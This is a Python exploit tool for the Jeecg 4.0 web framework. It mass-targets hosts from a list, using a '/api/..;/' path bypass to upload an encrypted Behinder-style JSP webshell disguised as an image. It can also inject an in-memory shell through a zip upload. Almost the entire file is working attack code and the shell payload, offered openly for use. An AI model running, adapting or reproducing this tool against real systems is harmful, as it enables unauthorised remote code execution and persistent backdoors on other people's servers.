#coding=utf-8
import sys
import getopt
import threading
import requests
import time

def help():
    print("""
    ------------------------------------------------------------------------- 
    Title   :   Jeecg4.0 GetShell
    Author  :   R4gd0ll
    Usage   :   python3 jeecg_v4.0_getshell.py -h

    -h --help     打开帮助
    -u --url      对单个ip进行测试
    -f --file     对文件中的所有ip进行测试
    -m --msmurl   注入冰蝎内存马(默认连接密码reyebond,支持4.0,仅支持单独ip测试)
    -------------------------------------------------------------------------
    """)
    
def injmsm(url):
    msmpayload = "/api/..;/cgformSqlController.do?doMigrateIn"
    msm_url = url + msmpayload

    headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Accept" : "*/*",
    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding" : "gzip, deflate",
    }

    msmfiles = {
    "file" : ('1.zip', open(r"xstreampoc.zip",'rb'), 'application/x-zip-compressed')
    }
    # proxies = {
    #     "http": "http://127.0.0.1:8081",
    # }
    res = requests.post(url =msm_url ,headers = headers, files= msmfiles,verify=False)
    if "java.lang" in res.text :
        print("Behinder msmshell success")
    else :
        exit("Behinder msmshell fail")

def upload(url):
    payload = "/api/..;/iconController.do?saveOrUpdateIcon"
    webshell = "/plug-in/accordion/images/1.jsp"
    
    target_url = url + payload
    webshell_url = url + webshell
    
    headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Accept" : "*/*",
    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding" : "gzip, deflate",
    }
    shellCode = '''
    <%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
    <%!
        private byte[] Decrypt(byte[] data) throws Exception
        {
            String k="e45e329feb5d925b";
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
            byte[] decodebs;
            Class baseCls ;
                    try{
                        System.out.println("33333");
                        baseCls=Class.forName("java.util.Base64");
                        Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                        decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                    }
                    catch (Throwable e)
                    {
                        System.out.println("444444");
                        baseCls = Class.forName("sun.misc.BASE64Decoder");
                        Object Decoder=baseCls.newInstance();
                        decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                    }
            return c.doFinal(decodebs);

        }
    %>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
            super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[512];
                int length=request.getInputStream().read(buf);
                while (length>0)
                {
                    byte[] data= Arrays.copyOfRange(buf,0,length);
                    bos.write(data);
                    length=request.getInputStream().read(buf);
                }
            new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
    %>
    '''

    files = {
        "file" : ('1.jsp', shellCode, 'image/png')
    }

    
    try:
        res = requests.post(target_url,headers=headers, files= files,verify=False)
        if res.status_code == 200  and 'success":true' in res.text:
            ws_res = requests.get(webshell_url,headers=headers,verify=False)
            if ws_res.status_code == 200 :
                print("[+] getshell success, webshell地址:{}".format(webshell_url))
            else:
                print("[-] getshell fail")    
        else:
            print("[-] getshell fail")
    except:
        print('[-] 访问出现错误！')


def main():
    opts,args1 = getopt.getopt(sys.argv[1:],
                              'hu:m:f:',
                              ['help','url=','msmurl=','file='])

    url_list = []
    for o,a in opts:
        if o in ['-h','--help']:
            help()
        elif o in ['-u','--url']:
            url = a
            upload(url)            
        elif o in ['-m','--msmurl']:
            msmurl = a
            injmsm(msmurl)
                
        elif o in ['-f','--file']:
            file = a
            try:
                f = open(file,'r')
                url_list = f.readlines()
                f.close()
            except:
                print('读取文件错误！')
        else:
            help()
    urls = []
    for i in url_list:
        urls.append(i.rstrip('\n'))

    max_thread = 10
    max_num = len(urls)
    num = 0
    while(True):
        if threading.active_count()-1 < max_thread and num < max_num:
            t = threading.Thread(target=upload,args=(urls[num],))
            t.start()
            num+=1
        if num >= max_num:
            if threading.active_count() -1 == 0:
                break

main()
